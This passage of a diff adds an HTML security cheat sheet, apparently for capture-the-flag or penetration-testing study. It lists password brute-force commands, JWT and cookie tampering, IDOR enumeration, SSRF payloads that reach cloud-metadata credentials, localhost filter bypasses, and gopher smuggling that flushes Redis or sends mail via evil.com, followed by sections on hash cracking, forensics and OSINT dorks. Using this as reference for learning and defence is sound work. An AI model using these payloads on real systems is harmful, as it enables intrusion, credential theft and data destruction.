+# Hydra - SSH
+hydra -l admin -P rockyou.txt ssh://target.com
+
+# Hydra - FTP
+hydra -l admin -P rockyou.txt ftp://target.com
+
+# Medusa
+medusa -h target.com -u admin -P rockyou.txt -M http -m DIR:/admin
+
+# wfuzz
+wfuzz -c -z file,rockyou.txt --hc 404 -d "username=admin&password=FUZZ" http://target.com/login.php
+
+# ffuf
+ffuf -w rockyou.txt -X POST -d "username=admin&password=FUZZ" -u http://target.com/login.php -fc 401</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">JWT Token Manipulation</div>
+                <div class="code-block"><code># JWT structure: header.payload.signature
+
+# None algorithm attack
+# Change "alg":"HS256" to "alg":"none"
+# Remove signature
+
+# Weak secret
+# Brute force HMAC secret
+hashcat -m 16500 jwt.txt rockyou.txt
+
+# jwt_tool
+python3 jwt_tool.py JWT_TOKEN
+
+# Change payload
+# Decode base64, modify, encode back</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Session Manipulation</div>
+                <div class="code-block"><code># Session fixation
+# Force victim to use attacker's session ID
+
+# Session prediction
+# If session IDs are sequential or predictable
+
+# Cookie manipulation
+# Change user_id, role, admin flags in cookies
+user_id=1 → user_id=2
+role=user → role=admin
+is_admin=0 → is_admin=1</code></div>
+            </div>
+        </div>
+        
+        <!-- IDOR -->
+        <div class="section" id="idor">
+            <div class="section-title">🔑 IDOR (Insecure Direct Object Reference)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Basic IDOR</div>
+                <div class="code-block"><code># URL parameter
+/profile.php?id=1
+/profile.php?id=2
+/profile.php?id=admin
+
+/document.php?doc_id=100
+/document.php?doc_id=101
+
+/api/user/1
+/api/user/2
+
+# POST parameter
+user_id=1 → user_id=2
+order_id=100 → order_id=101
+
+# Cookie
+user_id=1 → user_id=2</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">IDOR with GUIDs/UUIDs</div>
+                <div class="code-block"><code># Try to enumerate UUIDs
+/api/user/550e8400-e29b-41d4-a716-446655440000
+
+# Check for predictable patterns
+# Sequential UUIDs
+# Timestamp-based UUIDs</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">HTTP Methods IDOR</div>
+                <div class="code-block"><code># If GET shows info, try PUT/DELETE
+GET /api/user/1    # Read user 1
+PUT /api/user/2    # Modify user 2
+DELETE /api/user/3 # Delete user 3
+
+# Try different methods
+GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Automated IDOR Detection</div>
+                <div class="code-block"><code># Burp Intruder
+# Capture request with ID parameter
+# Send to Intruder
+# Set ID as payload position
+# Use numbers 1-1000 as payload
+# Check responses for differences
+
+# Example positions:
+/api/user/§1§
+id=§1§
+{"user_id":"§1§"}</code></div>
+            </div>
+            
+            <div class="tip">
+                <strong>💡 Common IDOR locations:</strong>
+                <ul style="margin: 5px 0 0 20px;">
+                    <li>User profiles (/user?id=)</li>
+                    <li>Documents (/document?id=)</li>
+                    <li>Orders (/order?id=)</li>
+                    <li>Messages (/message?id=)</li>
+                    <li>Invoices (/invoice?id=)</li>
+                    <li>API endpoints (/api/user/)</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- SSRF -->
+        <div class="section" id="ssrf">
+            <div class="section-title">🌐 SSRF (Server-Side Request Forgery)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Basic SSRF</div>
+                <div class="code-block"><code># Fetch URL parameter
+http://target.com/fetch.php?url=http://localhost
+http://target.com/fetch.php?url=http://127.0.0.1
+http://target.com/fetch.php?url=http://0.0.0.0
+
+# Internal services
+http://target.com/fetch.php?url=http://localhost:8080
+http://target.com/fetch.php?url=http://localhost:3306
+http://target.com/fetch.php?url=http://localhost:6379
+
+# Internal network
+http://target.com/fetch.php?url=http://192.168.1.1
+http://target.com/fetch.php?url=http://10.0.0.1</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Cloud Metadata</div>
+                <div class="code-block"><code># AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Filter Bypass</div>
+                <div class="code-block"><code># Localhost variations
+http://127.1
+http://127.0.1
+http://2130706433  (decimal)
+http://0x7f.0x0.0x0.0x1  (hex)
+http://0177.0000.0000.0001  (octal)
+http://localhost
+http://[::1]
+http://[0:0:0:0:0:0:0:1]
+
+# Using @ symbol
+http://expected-domain@127.0.0.1
+http://127.0.0.1@expected-domain
+
+# DNS rebinding
+# Use service like 1u.ms, nip.io
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+
+# URL encoding
+http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
+
+# Unicode
+http://127.0.0.1 → http://①②⑦.⓪.⓪.①
+
+# Using redirects
+# Create redirect on your server
+# http://attacker.com/redirect.php → 302 to http://localhost</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Protocol Smuggling</div>
+                <div class="code-block"><code># file:// protocol
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+# dict:// protocol
+dict://127.0.0.1:6379/info
+
+# gopher:// protocol
+gopher://127.0.0.1:6379/_SET%20key%20value
+
+# Using with Redis
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+
+# SMTP smuggling
+gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com</code></div>
+            </div>
+        </div>
+        
+        <!-- CRYPTOGRAPHY -->
+        <div class="section" id="crypto">
+            <div class="section-title">🔐 Cryptography & Encoding</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Base64</div>
+                <div class="code-block"><code># Decode
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+echo "SGVsbG8gV29ybGQ=" | base64 --decode
+
+# Encode
+echo "Hello World" | base64
+
+# Python
+import base64
+base64.b64decode("SGVsbG8gV29ybGQ=")
+base64.b64encode(b"Hello World")</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">ROT13</div>
+                <div class="code-block"><code># Bash
+echo "Uryyb Jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# Python
+import codecs
+codecs.decode("Uryyb Jbeyq", 'rot_13')</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Caesar Cipher</div>
+                <div class="code-block"><code># Python - brute force all shifts
+text = "Ifmmp Xpsme"
+for shift in range(26):
+    decoded = ''.join(chr((ord(c) - 65 - shift) % 26 + 65) if c.isupper() else chr((ord(c) - 97 - shift) % 26 + 97) if c.islower() else c for c in text)
+    print(f"Shift {shift}: {decoded}")</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Hex Encoding</div>
+                <div class="code-block"><code># Decode
+echo "48656c6c6f" | xxd -r -p
+echo "48656c6c6f" | xxd -r -plain
+
+# Encode
+echo "Hello" | xxd -p
+echo "Hello" | od -A n -t x1 | tr -d ' \n'
+
+# Python
+bytes.fromhex("48656c6c6f").decode()
+"Hello".encode().hex()</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">URL Encoding</div>
+                <div class="code-block"><code># Encode
+echo "Hello World" | jq -sRr @uri
+
+# Python
+import urllib.parse
+urllib.parse.quote("Hello World")
+
+# Decode
+python3 -c "import urllib.parse; print(urllib.parse.unquote('Hello%20World'))"</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">XOR</div>
+                <div class="code-block"><code># Python
+def xor(data, key):
+    return ''.join(chr(ord(c) ^ key) for c in data)
+
+encrypted = xor("Hello", 42)
+decrypted = xor(encrypted, 42)
+
+# XOR with repeating key
+def xor_repeating(data, key):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Hash Identification</div>
+                <div class="code-block"><code># hashid
+hashid hash.txt
+hashid -m hash.txt  # Show hashcat mode
+
+# hash-identifier
+hash-identifier
+
+# Common hash lengths
+# MD5: 32 chars
+# SHA1: 40 chars
+# SHA256: 64 chars
+# SHA512: 128 chars
+# NTLM: 32 chars</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Hash Cracking</div>
+                <div class="code-block"><code># John the Ripper
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --format=Raw-MD5 hash.txt --wordlist=rockyou.txt
+john --format=Raw-SHA256 hash.txt --wordlist=rockyou.txt
+john --format=NT hash.txt --wordlist=rockyou.txt
+john --show hash.txt
+
+# Hashcat
+hashcat -m 0 hash.txt rockyou.txt      # MD5
+hashcat -m 100 hash.txt rockyou.txt    # SHA1
+hashcat -m 1000 hash.txt rockyou.txt   # NTLM
+hashcat -m 1400 hash.txt rockyou.txt   # SHA256
+hashcat -m 1800 hash.txt rockyou.txt   # SHA512
+hashcat -m 3200 hash.txt rockyou.txt   # bcrypt
+hashcat --show hash.txt
+
+# Rules
+hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Mask attack
+hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l  # 8 lowercase letters
+
+# Online
+# https://crackstation.net
+# https://hashes.com
+# https://hashkiller.io</code></div>
+            </div>
+        </div>
+        
+        <!-- REVERSE ENGINEERING -->
+        <div class="section" id="reverse">
+            <div class="section-title">🔧 Reverse Engineering</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Static Analysis</div>
+                <div class="code-block"><code># File information
+file binary
+file -i binary  # MIME type
+
+# Strings
+strings binary
+strings -n 10 binary  # Min 10 characters
+strings -e l binary   # 16-bit little-endian
+strings -e b binary   # 16-bit big-endian
+
+# Check for packers
+upx -t binary
+
+# Disassemble
+objdump -d binary
+objdump -M intel -d binary  # Intel syntax
+
+# Headers
+readelf -h binary
+readelf -a binary  # All info
+readelf -s binary  # Symbols
+
+# Dependencies
+ldd binary</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Dynamic Analysis</div>
+                <div class="code-block"><code># System calls trace
+strace ./binary
+strace -e open,read,write ./binary
+strace -o output.txt ./binary
+
+# Library calls trace
+ltrace ./binary
+ltrace -o output.txt ./binary</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">GDB Debugging</div>
+                <div class="code-block"><code># Start GDB
+gdb ./binary
+gdb -q ./binary  # Quiet mode
+
+# Basic commands
+(gdb) break main          # Breakpoint at main
+(gdb) break *0x08048400   # Breakpoint at address
+(gdb) run                 # Run program
+(gdb) run arg1 arg2       # Run with arguments
+(gdb) continue            # Continue execution
+(gdb) next                # Step over
+(gdb) step                # Step into
+(gdb) finish              # Step out
+
+# Examine
+(gdb) disassemble main    # Disassemble function
+(gdb) info registers      # Show registers
+(gdb) info functions      # List functions
+(gdb) info variables      # List variables
+
+# Memory
+(gdb) x/20x $esp          # Examine 20 hex words at ESP
+(gdb) x/20i $eip          # Examine 20 instructions at EIP
+(gdb) x/s 0x08048000      # Examine string at address
+
+# Set values
+(gdb) set $eax=0x1234
+(gdb) set {int}0x08048000=0x90909090</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">radare2</div>
+                <div class="code-block"><code>r2 binary
+
+# Analysis
+&gt; aaa              # Analyze all
+&gt; afl              # List functions
+&gt; pdf @main       # Disassemble main
+&gt; s main          # Seek to main
+&gt; VV              # Visual graph mode
+
+# Memory
+&gt; px 100          # Print 100 bytes hex
+&gt; ps @address     # Print string at address
+
+# Search
+&gt; / flag{         # Search for string
+&gt; /x 4142434445   # Search hex
+
+# Debugging
+&gt; ood             # Reopen in debug mode
+&gt; db 0x08048400   # Set breakpoint
+&gt; dc              # Continue
+&gt; dr              # Show registers</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Python Decompilation</div>
+                <div class="code-block"><code># Decompile .pyc
+uncompyle6 file.pyc
+
+# Decompile Python executable
+pyinstxtractor file.exe
+uncompyle6 file.pyc</code></div>
+            </div>
+        </div>
+        
+        <!-- FORENSICS -->
+        <div class="section" id="forensics">
+            <div class="section-title">🔍 Digital Forensics</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">File Metadata</div>
+                <div class="code-block"><code># exiftool
+exiftool image.jpg
+exiftool document.pdf
+exiftool -a image.jpg  # Show all metadata
+exiftool -all= image.jpg  # Remove all metadata
+
+# Batch processing
+exiftool -r /path/to/directory/</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Hex Analysis</div>
+                <div class="code-block"><code># xxd
+xxd file.bin
+xxd file.bin | less
+xxd -l 100 file.bin  # First 100 bytes
+
+# hexdump
+hexdump -C file.bin
+hexdump -C file.bin | less
+
+# hexedit (interactive)
+hexedit file.bin</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Steganography</div>
+                <div class="code-block"><code># binwalk - detect hidden files
+binwalk file.jpg
+binwalk -e file.jpg  # Extract
+binwalk --dd='.*' file.jpg  # Extract all
+
+# foremost - file carving
+foremost file.jpg
+foremost -i file.jpg -o output/
+
+# steghide - hide/extract data
+steghide info file.jpg
+steghide extract -sf file.jpg
+steghide extract -sf file.jpg -p password
+
+# stegseek - brute force steghide
+stegseek file.jpg rockyou.txt
+
+# zsteg - PNG/BMP analysis
+zsteg file.png
+zsteg -a file.png  # Try all methods
+
+# stegsolve - visual analysis
+# GUI tool for LSB analysis
+
+# strings
+strings file.jpg
+strings -n 10 file.jpg</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Network Forensics (PCAP)</div>
+                <div class="code-block"><code># Wireshark filters
+http.request
+http.request.method == "POST"
+http.request.uri contains "admin"
+ftp
+ftp.request.command == "USER"
+ftp.request.command == "PASS"
+tcp.port == 80
+ip.addr == 192.168.1.100
+tcp.stream eq 0
+
+# tshark
+tshark -r capture.pcap
+tshark -r capture.pcap -Y "http.request"
+tshark -r capture.pcap -Y "http.request.method==POST"
+tshark -r capture.pcap -T fields -e http.request.uri
+tshark -r capture.pcap -T fields -e http.file_data
+
+# Extract HTTP objects
+tshark -r capture.pcap --export-objects http,output/
+
+# Find credentials
+tshark -r capture.pcap -Y "ftp.request.command==PASS" -T fields -e ftp.request.arg
+tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data | grep -i "password"
+
+# tcpdump
+tcpdump -r capture.pcap
+tcpdump -r capture.pcap -A  # ASCII
+tcpdump -r capture.pcap -X  # Hex + ASCII
+tcpdump -r capture.pcap 'port 80'
+tcpdump -r capture.pcap 'host 192.168.1.100'</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Memory Forensics (Volatility)</div>
+                <div class="code-block"><code># Determine profile
+volatility -f memory.dump imageinfo
+volatility -f memory.dump kdbgscan
+
+# Processes
+volatility -f memory.dump --profile=Win7SP1x64 pslist
+volatility -f memory.dump --profile=Win7SP1x64 pstree
+volatility -f memory.dump --profile=Win7SP1x64 psscan
+
+# Network
+volatility -f memory.dump --profile=Win7SP1x64 netscan
+volatility -f memory.dump --profile=Win7SP1x64 connections
+
+# Commands
+volatility -f memory.dump --profile=Win7SP1x64 cmdscan
+volatility -f memory.dump --profile=Win7SP1x64 consoles
+volatility -f memory.dump --profile=Win7SP1x64 cmdline
+
+# Files
+volatility -f memory.dump --profile=Win7SP1x64 filescan
+volatility -f memory.dump --profile=Win7SP1x64 filescan | grep -i "password"
+volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000001e8b6f20 --dump-dir=output/
+
+# Registry
+volatility -f memory.dump --profile=Win7SP1x64 hivelist
+volatility -f memory.dump --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Passwords
+volatility -f memory.dump --profile=Win7SP1x64 hashdump
+volatility -f memory.dump --profile=Win7SP1x64 lsadump
+
+# Malware
+volatility -f memory.dump --profile=Win7SP1x64 malfind
+volatility -f memory.dump --profile=Win7SP1x64 psxview</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Archive Cracking</div>
+                <div class="code-block"><code># ZIP
+fcrackzip -u -D -p rockyou.txt file.zip
+fcrackzip -b -c 'aA1!' -l 1-8 file.zip  # Brute force
+
+zip2john file.zip > hash.txt
+john hash.txt --wordlist=rockyou.txt
+
+# RAR
+rar2john file.rar > hash.txt
+john hash.txt
+
+# 7z
+7z2john file.7z > hash.txt
+john hash.txt
+
+# PDF
+pdf2john file.pdf > hash.txt
+john hash.txt</code></div>
+            </div>
+        </div>
+        
+        <!-- OSINT -->
+        <div class="section" id="osint">
+            <div class="section-title">🌐 OSINT Techniques</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Google Dorks</div>
+                <div class="code-block"><code>site:target.com
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"index of"
+site:target.com ext:sql | ext:db
+site:target.com intext:"password"
+site:target.com inurl:login
+site:target.com intitle:"Dashboard" intext:"admin"
+
+# Exposed files
+filetype:env "DB_PASSWORD"
+filetype:log "password"
+filetype:sql "INSERT INTO" "password"
+
+# Subdomains
+site:*.target.com
+
+# Cached pages
+cache:target.com</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">DNS Enumeration</div>
+                <div class="code-block"><code># Whois
+whois target.com
+whois 8.8.8.8
+
+# DNS lookup
+nslookup target.com
+nslookup -type=mx target.com
+nslookup -type=ns target.com
+nslookup -type=txt target.com
+
+dig target.com
+dig target.com ANY
+dig target.com MX
+dig target.com NS
+dig target.com TXT
+dig @8.8.8.8 target.com
+
+# Reverse DNS
+dig -x 8.8.8.8
+
+# Zone transfer
+dig axfr @ns1.target.com target.com</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Subdomain Enumeration</div>
+                <div class="code-block"><code># subfinder
+subfinder -d target.com
+subfinder -d target.com -o output.txt
+
+# amass
+amass enum -d target.com
+amass enum -passive -d target.com
+
+# sublist3r
+sublist3r -d target.com
+
+# assetfinder
+assetfinder target.com
+
+# crt.sh
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Security Trails
+# https://securitytrails.com/domain/target.com/dns</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Shodan</div>
+                <div class="code-block"><code># Shodan CLI
+shodan search "org:target"
+shodan search "hostname:target.com"
+shodan host 8.8.8.8
+shodan search "port:3389"
+shodan search "apache"
+
+# Shodan dorks
+org:"Target Company"
+hostname:"target.com"
+port:3389
+http.title:"Dashboard"
+ssl:"target.com"</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Email Harvesting</div>
+                <div class="code-block"><code># theHarvester
+theHarvester -d target.com -b google
+theHarvester -d target.com -b bing
+theHarvester -d target.com -b linkedin
+theHarvester -d target.com -b all
+
+# hunter.io
+# https://hunter.io/search/target.com</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Wayback Machine</div>
+                <div class="code-block"><code># waybackurls
+echo target.com | waybackurls
+
+# Online
+# https://web.archive.org/web/*/target.com
+
+# Find old endpoints
+echo target.com | waybackurls | grep -E "\.js$|\.php$|\.asp$"</code></div>
+            </div>
+        </div>
+        
+    </div>
+</body>
+</html>
+        
+
